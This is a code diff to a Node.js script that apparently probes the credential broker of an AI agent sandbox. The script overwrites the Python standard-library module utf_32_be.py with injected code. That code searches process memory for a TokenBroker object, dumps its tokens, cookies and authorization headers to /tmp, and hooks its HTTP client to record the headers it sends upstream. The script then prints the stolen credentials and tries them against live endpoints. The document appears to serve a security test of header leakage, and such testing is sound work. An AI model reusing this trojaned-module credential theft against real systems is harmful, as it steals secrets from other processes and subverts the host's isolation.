@@ -3,9 +3,11 @@ const http = require("node:http");
 const https = require("node:https");
 
 const capturePath = "/tmp/gflb-broker-credentials.json";
+const requestCapturePath = "/tmp/gflb-bedrock-upstream-request.json";
 const sourcePath = "/usr/local/lib/python3.13/encodings/utf_32_be.py";
 const pycPath = "/usr/local/lib/python3.13/encodings/__pycache__/utf_32_be.cpython-313.pyc";
 try { fs.unlinkSync(capturePath); } catch {}
+try { fs.unlinkSync(requestCapturePath); } catch {}
 
 function encodeUtf32BE(text) {
   const bytes = Buffer.alloc(text.length * 4);
@@ -41,13 +43,27 @@ function directRequest(url, method, headers, body, timeout = 30000) {
   });
 }
 
+function localRequest(path, method, headers, body, timeout = 30000) {
+  return new Promise((resolve, reject) => {
+    const requestHeaders = { ...headers, "Content-Length": body.length };
+    const req = http.request({ hostname: "127.0.0.1", port: 8082, path, method, headers: requestHeaders, timeout }, (res) => {
+      const chunks = [];
+      res.on("data", (chunk) => chunks.push(chunk));
+      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString("utf8") }));
+    });
+    req.on("timeout", () => req.destroy(new Error("timeout")));
+    req.on("error", reject);
+    req.end(body);
+  });
+}
+
 async function main() {
   const original = fs.readFileSync(sourcePath);
   const stat = fs.statSync(sourcePath);
   let pyc = null;
   let pycStat = null;
   try { pyc = fs.readFileSync(pycPath); pycStat = fs.statSync(pycPath); } catch {}
-  const injected = `# coding: utf-8\nimport gc as _g, json as _j\nfor _o in _g.get_objects():\n    if type(_o).__name__ == "TokenBroker" and hasattr(_o, "_token"):\n        _d = {"conversation_token": _o._token, "ldso_cookie": _o._ldso_cookie, "git_authorization": _o._git_authorization, "gonfalon_authorization": _o._gonfalon_authorization, "upstreams": _o._upstreams}\n        open(${JSON.stringify(capturePath)}, "w", encoding="utf-8").write(_j.dumps(_d, sort_keys=True))\n        break\nexec(compile(__import__("base64").b64decode(${JSON.stringify(original.toString("base64"))}), __file__, "exec"))\n`;
+  const injected = `# coding: utf-8\nimport gc as _g, json as _j\nfor _o in _g.get_objects():\n    if type(_o).__name__ == "TokenBroker" and hasattr(_o, "_token"):\n        _d = {"conversation_token": _o._token, "ldso_cookie": _o._ldso_cookie, "git_authorization": _o._git_authorization, "gonfalon_authorization": _o._gonfalon_authorization, "upstreams": _o._upstreams}\n        open(${JSON.stringify(capturePath)}, "w", encoding="utf-8").write(_j.dumps(_d, sort_keys=True))\n        _original_send = _o._client.send\n        async def _capture_send(_request, *_args, **_kwargs):\n            if "bedrock-proxy.observability.app.launchdarkly.com" in str(_request.url):\n                _request_data = {"method": _request.method, "url": str(_request.url), "headers": list(_request.headers.multi_items())}\n                open(${JSON.stringify(requestCapturePath)}, "w", encoding="utf-8").write(_j.dumps(_request_data, sort_keys=True))\n                _o._client.send = _original_send\n            return await _original_send(_request, *_args, **_kwargs)\n        _o._client.send = _capture_send\n        break\nexec(compile(__import__("base64").b64decode(${JSON.stringify(original.toString("base64"))}), __file__, "exec"))\n`;
   fs.writeFileSync(sourcePath, injected, { mode: stat.mode & 0o7777 });
   let response;
   try {
@@ -62,6 +78,21 @@ async function main() {
   }
   const captured = fs.readFileSync(capturePath, "utf8");
   const credentials = JSON.parse(captured);
+  const probeBody = Buffer.from(JSON.stringify({ anthropic_version: "bedrock-2023-05-31", max_tokens: 1, messages: [{ role: "user", content: "upstream header inventory" }] }));
+  const upstreamResponse = await localRequest(
+    "/bedrock/model/us.anthropic.claude-does-not-exist/invoke",
+    "POST",
+    {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      "anthropic-version": "2023-06-01",
+      Authorization: "Bearer AGENT_VALUE_MUST_NOT_REACH_UPSTREAM",
+      Cookie: "agent_cookie=MUST_NOT_REACH_UPSTREAM",
+      "x-amz-security-token": "MUST_NOT_REACH_UPSTREAM",
+    },
+    probeBody,
+  );
+  const upstreamRequest = fs.readFileSync(requestCapturePath, "utf8");
   const token = credentials.conversation_token;
   const wrongToken = token.slice(0, -1) + (token.endsWith("A") ? "B" : "A");
   const callbackBody = Buffer.from("{}");
@@ -73,6 +104,8 @@ async function main() {
   const inferenceWrong = await directRequest(`${credentials.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(wrongToken), callbackBody);
   console.log(`BROKER_TRIGGER_RESPONSE=${JSON.stringify(response)}`);
   console.log(`BROKER_CREDENTIAL_CAPTURE=${captured}`);
+  console.log(`BEDROCK_UPSTREAM_REQUEST=${upstreamRequest}`);
+  console.log(`BEDROCK_UPSTREAM_RESPONSE=${JSON.stringify(upstreamResponse)}`);
   console.log(`CALLBACK_TOKEN_CORRECT=${JSON.stringify(callbackCorrect)}`);
   console.log(`CALLBACK_TOKEN_WRONG=${JSON.stringify(callbackWrong)}`);
   console.log(`INFERENCE_TOKEN_CORRECT=${JSON.stringify(inferenceCorrect)}`);
